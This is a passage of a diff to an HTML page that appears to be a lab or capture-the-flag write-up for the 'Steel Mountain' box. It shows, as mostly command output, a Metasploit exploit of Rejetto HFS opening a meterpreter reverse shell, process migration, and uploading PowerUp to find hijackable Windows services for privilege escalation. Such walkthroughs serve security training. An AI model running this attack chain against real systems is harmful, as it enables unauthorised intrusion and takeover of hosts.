+</span></span><span style="display:flex;"><span>   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+</span></span><span style="display:flex;"><span>   LHOST     tun0             yes       The listen address (an interface may be specified)
+</span></span><span style="display:flex;"><span>   LPORT     4444             yes       The listen port
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exploit target:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Id  Name
+</span></span><span style="display:flex;"><span>   --  ----
+</span></span><span style="display:flex;"><span>   0   Automatic
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf5 exploit(windows/http/rejetto_hfs_exec) &gt; set RHOSTS 10.10.29.$IP
+</span></span><span style="display:flex;"><span>RHOSTS =&gt; $IP
+</span></span><span style="display:flex;"><span>msf5 exploit(windows/http/rejetto_hfs_exec) &gt; options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options (exploit/windows/http/rejetto_hfs_exec):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name       Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----       ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   HTTPDELAY  10               no        Seconds to wait before terminating web server
+</span></span><span style="display:flex;"><span>   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+</span></span><span style="display:flex;"><span>   RHOSTS     $IP              yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+</span></span><span style="display:flex;"><span>   RPORT      80               yes       The target port (TCP)
+</span></span><span style="display:flex;"><span>   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+</span></span><span style="display:flex;"><span>   SRVPORT    8080             yes       The local port to listen on.
+</span></span><span style="display:flex;"><span>   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+</span></span><span style="display:flex;"><span>   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+</span></span><span style="display:flex;"><span>   TARGETURI  /                yes       The path of the web application
+</span></span><span style="display:flex;"><span>   URIPATH                     no        The URI to use for this exploit (default is random)
+</span></span><span style="display:flex;"><span>   VHOST                       no        HTTP server virtual host
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload options (windows/meterpreter/reverse_tcp):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name      Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----      ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+</span></span><span style="display:flex;"><span>   LHOST     tun0             yes       The listen address (an interface may be specified)
+</span></span><span style="display:flex;"><span>   LPORT     4444             yes       The listen port
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exploit target:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Id  Name
+</span></span><span style="display:flex;"><span>   --  ----
+</span></span><span style="display:flex;"><span>   0   Automatic
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf5 exploit(windows/http/rejetto_hfs_exec) &gt; options set RHOSTS $IP10.10.29.151
+</span></span><span style="display:flex;"><span>RHOSTS =&gt; 10.10.29.151
+</span></span><span style="display:flex;"><span>msf5 exploit(windows/http/rejetto_hfs_exec) &gt; set RPORT 8080
+</span></span><span style="display:flex;"><span>RPORT =&gt; 8080
+</span></span><span style="display:flex;"><span>msf5 exploit(windows/http/rejetto_hfs_exec) &gt; exploit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Started reverse TCP handler on 10.8.7.19:4444
+</span></span><span style="display:flex;"><span>[*] Using URL: http://0.0.0.0:8080/6q6f8cxkkYZZ1Bf
+</span></span><span style="display:flex;"><span>[*] Local IP: http://10.8.7.19:8080/6q6f8cxkkYZZ1Bf
+</span></span><span style="display:flex;"><span>[*] Server started.
+</span></span><span style="display:flex;"><span>[*] Sending a malicious request to /
+</span></span><span style="display:flex;"><span>[*] Payload request received: /6q6f8cxkkYZZ1Bf
+</span></span><span style="display:flex;"><span>[*] Sending stage (176195 bytes) to 10.10.29.151
+</span></span><span style="display:flex;"><span>[*] Meterpreter session 1 opened (10.8.7.19:4444 -&gt; 10.10.29.151:49403) at 2020-07-25 14:33:52 +0100
+</span></span><span style="display:flex;"><span>[!] Tried to delete %TEMP%\uZSLPzm.vbs, unknown result
+</span></span><span style="display:flex;"><span>[*] Server stopped.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; sysinfo
+</span></span><span style="display:flex;"><span>Computer        : STEELMOUNTAIN
+</span></span><span style="display:flex;"><span>OS              : Windows 2012 R2 (6.3 Build 9600).
+</span></span><span style="display:flex;"><span>Architecture    : x64
+</span></span><span style="display:flex;"><span>System Language : en_US
+</span></span><span style="display:flex;"><span>Domain          : WORKGROUP
+</span></span><span style="display:flex;"><span>Logged On Users : 1
+</span></span><span style="display:flex;"><span>Meterpreter     : x86/windows
+</span></span><span style="display:flex;"><span>meterpreter &gt;
+</span></span></code></pre></div><p>Fantastic! We now have a remote shell on the server as a standard user.</p>
 <p>Next, we need to migrate the Meterpreter session to a different service. With us having low privileges we cannot migrate to one of the usual processes (winlogon, lsass, etc.) so instead we will have to use a lower privilege service, such as explorer.exe.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">meterpreter &gt; migrate
-Usage: migrate &lt;&lt;pid&gt; | -P &lt;pid&gt; | -N &lt;name&gt;&gt; [-t timeout]
-
-Migrates the server instance to another process.
-NOTE: Any open channels or other dynamic state will be lost.
-
-meterpreter &gt; ps
-
-Process List
-============
-
- PID   PPID  Name                  Arch  Session  User                Path
- ---   ----  ----                  ----  -------  ----                ----
- 0     0     [System Process]
- 4     0     System
- 360   4     smss.exe
- 484   640   svchost.exe
- 492   484   csrss.exe
- 544   536   csrss.exe
- 552   484   wininit.exe
- 580   536   winlogon.exe
- 640   552   services.exe
- 648   552   lsass.exe                                                
- 704   640   svchost.exe                                              
- 732   640   svchost.exe                                              
- 824   640   ASCService.exe                                           
- 836   580   dwm.exe                                                  
- 940   640   svchost.exe                                              
- 980   640   svchost.exe                                              
- 1004  640   svchost.exe                                              
- 1044  640   svchost.exe                                              
- 1116  640   svchost.exe                                              
- 1208  640   spoolsv.exe                                              
- 1232  640   amazon-ssm-agent.exe                                     
- 1300  640   svchost.exe                                              
- 1324  640   LiteAgent.exe                                            
- 1440  1820  pteebwGfDNKEv.exe     x86   1        STEELMOUNTAIN\bill  C:\Users\bill\AppData\Local\Temp\1\rad33352.tmp\pteebwGfDNKEv.exe
- 1448  640   LiveUpdate.exe                                           
- 1500  640   svchost.exe                                              
- 1520  640   svchost.exe                                              
- 1568  640   wlms.exe                                                 
- 1656  640   Ec2Config.exe                                            
- 1820  2436  wscript.exe           x86   1        STEELMOUNTAIN\bill  C:\Windows\SysWOW64\wscript.exe
- 1840  704   SppExtComObj.Exe                                         
- 1896  1440  cmd.exe               x86   1        STEELMOUNTAIN\bill  C:\Windows\SysWOW64\cmd.exe
- 1932  640   sppsvc.exe                                               
- 2020  1896  conhost.exe           x64   1        STEELMOUNTAIN\bill  C:\Windows\System32\conhost.exe
- 2028  640   svchost.exe                                              
- 2168  1520  w3wp.exe                                                 
- 2388  704   WmiPrvSE.exe                                             
- 2436  2680  hfs.exe               x86   1        STEELMOUNTAIN\bill  C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hfs.exe
- 2608  980   taskhostex.exe        x64   1        STEELMOUNTAIN\bill  C:\Windows\System32\taskhostex.exe
- 2680  2640  explorer.exe          x64   1        STEELMOUNTAIN\bill  C:\Windows\explorer.exe
- 2860  640   msdtc.exe
-
-meterpreter &gt; migrate -N explorer.exe
-[*] Migrating from 1440 to 2680...
-[*] Migration completed successfully.
-meterpreter &gt;
-</code></pre></div><p>Done! Now we can safely grab the user flag and look to elevate our privileges.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>meterpreter &gt; migrate
+</span></span><span style="display:flex;"><span>Usage: migrate &lt;&lt;pid&gt; | -P &lt;pid&gt; | -N &lt;name&gt;&gt; [-t timeout]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Migrates the server instance to another process.
+</span></span><span style="display:flex;"><span>NOTE: Any open channels or other dynamic state will be lost.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; ps
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Process List
+</span></span><span style="display:flex;"><span>============
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> PID   PPID  Name                  Arch  Session  User                Path
+</span></span><span style="display:flex;"><span> ---   ----  ----                  ----  -------  ----                ----
+</span></span><span style="display:flex;"><span> 0     0     [System Process]
+</span></span><span style="display:flex;"><span> 4     0     System
+</span></span><span style="display:flex;"><span> 360   4     smss.exe
+</span></span><span style="display:flex;"><span> 484   640   svchost.exe
+</span></span><span style="display:flex;"><span> 492   484   csrss.exe
+</span></span><span style="display:flex;"><span> 544   536   csrss.exe
+</span></span><span style="display:flex;"><span> 552   484   wininit.exe
+</span></span><span style="display:flex;"><span> 580   536   winlogon.exe
+</span></span><span style="display:flex;"><span> 640   552   services.exe
+</span></span><span style="display:flex;"><span> 648   552   lsass.exe                                                
+</span></span><span style="display:flex;"><span> 704   640   svchost.exe                                              
+</span></span><span style="display:flex;"><span> 732   640   svchost.exe                                              
+</span></span><span style="display:flex;"><span> 824   640   ASCService.exe                                           
+</span></span><span style="display:flex;"><span> 836   580   dwm.exe                                                  
+</span></span><span style="display:flex;"><span> 940   640   svchost.exe                                              
+</span></span><span style="display:flex;"><span> 980   640   svchost.exe                                              
+</span></span><span style="display:flex;"><span> 1004  640   svchost.exe                                              
+</span></span><span style="display:flex;"><span> 1044  640   svchost.exe                                              
+</span></span><span style="display:flex;"><span> 1116  640   svchost.exe                                              
+</span></span><span style="display:flex;"><span> 1208  640   spoolsv.exe                                              
+</span></span><span style="display:flex;"><span> 1232  640   amazon-ssm-agent.exe                                     
+</span></span><span style="display:flex;"><span> 1300  640   svchost.exe                                              
+</span></span><span style="display:flex;"><span> 1324  640   LiteAgent.exe                                            
+</span></span><span style="display:flex;"><span> 1440  1820  pteebwGfDNKEv.exe     x86   1        STEELMOUNTAIN\bill  C:\Users\bill\AppData\Local\Temp\1\rad33352.tmp\pteebwGfDNKEv.exe
+</span></span><span style="display:flex;"><span> 1448  640   LiveUpdate.exe                                           
+</span></span><span style="display:flex;"><span> 1500  640   svchost.exe                                              
+</span></span><span style="display:flex;"><span> 1520  640   svchost.exe                                              
+</span></span><span style="display:flex;"><span> 1568  640   wlms.exe                                                 
+</span></span><span style="display:flex;"><span> 1656  640   Ec2Config.exe                                            
+</span></span><span style="display:flex;"><span> 1820  2436  wscript.exe           x86   1        STEELMOUNTAIN\bill  C:\Windows\SysWOW64\wscript.exe
+</span></span><span style="display:flex;"><span> 1840  704   SppExtComObj.Exe                                         
+</span></span><span style="display:flex;"><span> 1896  1440  cmd.exe               x86   1        STEELMOUNTAIN\bill  C:\Windows\SysWOW64\cmd.exe
+</span></span><span style="display:flex;"><span> 1932  640   sppsvc.exe                                               
+</span></span><span style="display:flex;"><span> 2020  1896  conhost.exe           x64   1        STEELMOUNTAIN\bill  C:\Windows\System32\conhost.exe
+</span></span><span style="display:flex;"><span> 2028  640   svchost.exe                                              
+</span></span><span style="display:flex;"><span> 2168  1520  w3wp.exe                                                 
+</span></span><span style="display:flex;"><span> 2388  704   WmiPrvSE.exe                                             
+</span></span><span style="display:flex;"><span> 2436  2680  hfs.exe               x86   1        STEELMOUNTAIN\bill  C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hfs.exe
+</span></span><span style="display:flex;"><span> 2608  980   taskhostex.exe        x64   1        STEELMOUNTAIN\bill  C:\Windows\System32\taskhostex.exe
+</span></span><span style="display:flex;"><span> 2680  2640  explorer.exe          x64   1        STEELMOUNTAIN\bill  C:\Windows\explorer.exe
+</span></span><span style="display:flex;"><span> 2860  640   msdtc.exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; migrate -N explorer.exe
+</span></span><span style="display:flex;"><span>[*] Migrating from 1440 to 2680...
+</span></span><span style="display:flex;"><span>[*] Migration completed successfully.
+</span></span><span style="display:flex;"><span>meterpreter &gt;
+</span></span></code></pre></div><p>Done! Now we can safely grab the user flag and look to elevate our privileges.</p>
 <h2 id="privilege-escalation">Privilege Escalation</h2>
 <p>Since we know that the server we are attacking is a Windows host, we can make use of PowerShell post exploitation frameworks and modules to enumerate more information about the host and identify abnormalities. In particular we will be using the PowerUp module that comes as part of the PowerSploit post exploitation framework.</p>
 <p>The PowerUp script performs a number of checks on the target to identify any weaknesses or misconfigurations that would allow the user to elevate their permissions. An alternative tool we can use is the winpeas script (EXE or Batch) to perform the privilege escalation checks.</p>
 <p>We will need to grab a copy of the script, which can be donwloaded from the PowerSploit github repository, upload it to the server and load the PowerShell into our Meterpreter session. This allows us to use PowerShell based shells on the target.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">meterpreter &gt; cd %DESKTOP%
-meterpreter &gt; pwd
-C:\Users\bill\Desktop
-meterpreter &gt; upload /opt/tools/postexploitation/PowerSploit/Privesc/PowerUp.ps1
-[*] uploading  : /opt/tools/postexploitation/PowerSploit/Privesc/PowerUp.ps1 -&gt; PowerUp.ps1
-[*] Uploaded 549.65 KiB of 549.65 KiB (100.0%): /opt/tools/postexploitation/PowerSploit/Privesc/PowerUp.ps1 -&gt; PowerUp.ps1
-[*] uploaded   : /opt/tools/postexploitation/PowerSploit/Privesc/PowerUp.ps1 -&gt; PowerUp.ps1
-meterpreter &gt; load powershell
-Loading extension powershell...Success.
-meterpreter &gt; powershell_shell
-PS&gt;
-</code></pre></div><p>Within this PowerShell prompt we can execute the script, call the <code>Invoke-AllChecks</code> function and wait to see what information is returned.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PS&gt; . .\PowerUp.ps1
-PS&gt; Invoke-AllChecks
-
-[*] Running Invoke-AllChecks
-
-[*] Checking if user is in a local group with administrative privileges...
-
-[*] Checking for unquoted service paths...
-
-ServiceName    : AdvancedSystemCareService9
-Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
-ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
-StartName      : LocalSystem
-AbuseFunction  : Write-ServiceBinary -Name &#39;AdvancedSystemCareService9&#39; -Path &lt;HijackPath&gt;
-CanRestart     : True
-
-ServiceName    : AdvancedSystemCareService9
-Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
-ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
-StartName      : LocalSystem
-AbuseFunction  : Write-ServiceBinary -Name &#39;AdvancedSystemCareService9&#39; -Path &lt;HijackPath&gt;
-CanRestart     : True
-
-ServiceName    : AWSLiteAgent
-Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
-ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
-StartName      : LocalSystem
-AbuseFunction  : Write-ServiceBinary -Name &#39;AWSLiteAgent&#39; -Path &lt;HijackPath&gt;
-CanRestart     : False
-
-ServiceName    : AWSLiteAgent
-Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
-ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
-StartName      : LocalSystem
-AbuseFunction  : Write-ServiceBinary -Name &#39;AWSLiteAgent&#39; -Path &lt;HijackPath&gt;
-CanRestart     : False
-
-ServiceName    : IObitUnSvr
-Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
-ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
-StartName      : LocalSystem
-AbuseFunction  : Write-ServiceBinary -Name &#39;IObitUnSvr&#39; -Path &lt;HijackPath&gt;
-CanRestart     : False
-
-ServiceName    : IObitUnSvr
-Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
-ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
-StartName      : LocalSystem
-AbuseFunction  : Write-ServiceBinary -Name &#39;IObitUnSvr&#39; -Path &lt;HijackPath&gt;
-CanRestart     : False
-
-ServiceName    : LiveUpdateSvc
-Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
-ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
-StartName      : LocalSystem
-AbuseFunction  : Write-ServiceBinary -Name &#39;LiveUpdateSvc&#39; -Path &lt;HijackPath&gt;
-CanRestart     : False
-
-ServiceName    : LiveUpdateSvc
-Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
-ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
-StartName      : LocalSystem
-AbuseFunction  : Write-ServiceBinary -Name &#39;LiveUpdateSvc&#39; -Path &lt;HijackPath&gt;
-CanRestart     : False
-
-[*] Checking service executable and argument permissions...
-
-ServiceName                     : AdvancedSystemCareService9
-Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
-ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
-ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
-ModifiableFileIdentityReference : STEELMOUNTAIN\bill
-StartName                       : LocalSystem
-AbuseFunction                   : Install-ServiceBinary -Name &#39;AdvancedSystemCareService9&#39;
-CanRestart                      : True
-
-ServiceName                     : IObitUnSvr
-Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
-ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
-ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
-ModifiableFileIdentityReference : STEELMOUNTAIN\bill
-StartName                       : LocalSystem
-AbuseFunction                   : Install-ServiceBinary -Name &#39;IObitUnSvr&#39;
-CanRestart                      : False
-
-ServiceName                     : LiveUpdateSvc
-Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
-ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
-ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
-ModifiableFileIdentityReference : STEELMOUNTAIN\bill
-StartName                       : LocalSystem
-AbuseFunction                   : Install-ServiceBinary -Name &#39;LiveUpdateSvc&#39;
-CanRestart                      : False
-
-[*] Checking service permissions...
-
-[*] Checking %PATH% for potentially hijackable DLL locations...
-
-[*] Checking for AlwaysInstallElevated registry key...
-
-[*] Checking for Autologon credentials in registry...
-
-[*] Checking for modifidable registry autoruns and configs...
-
-[*] Checking for modifiable schtask files/configs...
-
-[*] Checking for unattended install files...
-
-[*] Checking for encrypted web.config strings...
-
-[*] Checking for encrypted application pool and virtual directory passwords...
-
-[*] Checking for plaintext passwords in McAfee SiteList.xml files....
-
-[*] Checking for cached Group Policy Preferences .xml files....
-</code></pre></div><p>Looking at the output we can see a few services and binaries that could allow us to elevate our permissions, however there is one key service (AdvancedSystemCareService9) that looks more promising compared to the rest because:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>meterpreter &gt; cd %DESKTOP%
+</span></span><span style="display:flex;"><span>meterpreter &gt; pwd
+</span></span><span style="display:flex;"><span>C:\Users\bill\Desktop
+</span></span><span style="display:flex;"><span>meterpreter &gt; upload /opt/tools/postexploitation/PowerSploit/Privesc/PowerUp.ps1
+</span></span><span style="display:flex;"><span>[*] uploading  : /opt/tools/postexploitation/PowerSploit/Privesc/PowerUp.ps1 -&gt; PowerUp.ps1
+</span></span><span style="display:flex;"><span>[*] Uploaded 549.65 KiB of 549.65 KiB (100.0%): /opt/tools/postexploitation/PowerSploit/Privesc/PowerUp.ps1 -&gt; PowerUp.ps1
+</span></span><span style="display:flex;"><span>[*] uploaded   : /opt/tools/postexploitation/PowerSploit/Privesc/PowerUp.ps1 -&gt; PowerUp.ps1
+</span></span><span style="display:flex;"><span>meterpreter &gt; load powershell
+</span></span><span style="display:flex;"><span>Loading extension powershell...Success.
+</span></span><span style="display:flex;"><span>meterpreter &gt; powershell_shell
+</span></span><span style="display:flex;"><span>PS&gt;
+</span></span></code></pre></div><p>Within this PowerShell prompt we can execute the script, call the <code>Invoke-AllChecks</code> function and wait to see what information is returned.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PS&gt; . .\PowerUp.ps1
+</span></span><span style="display:flex;"><span>PS&gt; Invoke-AllChecks
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Running Invoke-AllChecks
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Checking if user is in a local group with administrative privileges...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Checking for unquoted service paths...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ServiceName    : AdvancedSystemCareService9
+</span></span><span style="display:flex;"><span>Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+</span></span><span style="display:flex;"><span>ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+</span></span><span style="display:flex;"><span>StartName      : LocalSystem
+</span></span><span style="display:flex;"><span>AbuseFunction  : Write-ServiceBinary -Name &#39;AdvancedSystemCareService9&#39; -Path &lt;HijackPath&gt;
+</span></span><span style="display:flex;"><span>CanRestart     : True
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ServiceName    : AdvancedSystemCareService9
+</span></span><span style="display:flex;"><span>Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+</span></span><span style="display:flex;"><span>ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+</span></span><span style="display:flex;"><span>StartName      : LocalSystem
+</span></span><span style="display:flex;"><span>AbuseFunction  : Write-ServiceBinary -Name &#39;AdvancedSystemCareService9&#39; -Path &lt;HijackPath&gt;
+</span></span><span style="display:flex;"><span>CanRestart     : True
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ServiceName    : AWSLiteAgent
+</span></span><span style="display:flex;"><span>Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
+</span></span><span style="display:flex;"><span>ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+</span></span><span style="display:flex;"><span>StartName      : LocalSystem
+</span></span><span style="display:flex;"><span>AbuseFunction  : Write-ServiceBinary -Name &#39;AWSLiteAgent&#39; -Path &lt;HijackPath&gt;
+</span></span><span style="display:flex;"><span>CanRestart     : False
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ServiceName    : AWSLiteAgent
+</span></span><span style="display:flex;"><span>Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
+</span></span><span style="display:flex;"><span>ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+</span></span><span style="display:flex;"><span>StartName      : LocalSystem
+</span></span><span style="display:flex;"><span>AbuseFunction  : Write-ServiceBinary -Name &#39;AWSLiteAgent&#39; -Path &lt;HijackPath&gt;
+</span></span><span style="display:flex;"><span>CanRestart     : False
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ServiceName    : IObitUnSvr
+</span></span><span style="display:flex;"><span>Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+</span></span><span style="display:flex;"><span>ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+</span></span><span style="display:flex;"><span>StartName      : LocalSystem
+</span></span><span style="display:flex;"><span>AbuseFunction  : Write-ServiceBinary -Name &#39;IObitUnSvr&#39; -Path &lt;HijackPath&gt;
+</span></span><span style="display:flex;"><span>CanRestart     : False
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ServiceName    : IObitUnSvr
+</span></span><span style="display:flex;"><span>Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+</span></span><span style="display:flex;"><span>ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+</span></span><span style="display:flex;"><span>StartName      : LocalSystem
+</span></span><span style="display:flex;"><span>AbuseFunction  : Write-ServiceBinary -Name &#39;IObitUnSvr&#39; -Path &lt;HijackPath&gt;
+</span></span><span style="display:flex;"><span>CanRestart     : False
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ServiceName    : LiveUpdateSvc
+</span></span><span style="display:flex;"><span>Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+</span></span><span style="display:flex;"><span>ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+</span></span><span style="display:flex;"><span>StartName      : LocalSystem
+</span></span><span style="display:flex;"><span>AbuseFunction  : Write-ServiceBinary -Name &#39;LiveUpdateSvc&#39; -Path &lt;HijackPath&gt;
+</span></span><span style="display:flex;"><span>CanRestart     : False
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ServiceName    : LiveUpdateSvc
+</span></span><span style="display:flex;"><span>Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+</span></span><span style="display:flex;"><span>ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+</span></span><span style="display:flex;"><span>StartName      : LocalSystem
+</span></span><span style="display:flex;"><span>AbuseFunction  : Write-ServiceBinary -Name &#39;LiveUpdateSvc&#39; -Path &lt;HijackPath&gt;
+</span></span><span style="display:flex;"><span>CanRestart     : False
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Checking service executable and argument permissions...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ServiceName                     : AdvancedSystemCareService9
+</span></span><span style="display:flex;"><span>Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+</span></span><span style="display:flex;"><span>ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+</span></span><span style="display:flex;"><span>ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+</span></span><span style="display:flex;"><span>ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+</span></span><span style="display:flex;"><span>StartName                       : LocalSystem
+</span></span><span style="display:flex;"><span>AbuseFunction                   : Install-ServiceBinary -Name &#39;AdvancedSystemCareService9&#39;
+</span></span><span style="display:flex;"><span>CanRestart                      : True
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ServiceName                     : IObitUnSvr
+</span></span><span style="display:flex;"><span>Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+</span></span><span style="display:flex;"><span>ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+</span></span><span style="display:flex;"><span>ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+</span></span><span style="display:flex;"><span>ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+</span></span><span style="display:flex;"><span>StartName                       : LocalSystem
+</span></span><span style="display:flex;"><span>AbuseFunction                   : Install-ServiceBinary -Name &#39;IObitUnSvr&#39;
+</span></span><span style="display:flex;"><span>CanRestart                      : False
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ServiceName                     : LiveUpdateSvc
+</span></span><span style="display:flex;"><span>Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+</span></span><span style="display:flex;"><span>ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+</span></span><span style="display:flex;"><span>ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+</span></span><span style="display:flex;"><span>ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+</span></span><span style="display:flex;"><span>StartName                       : LocalSystem
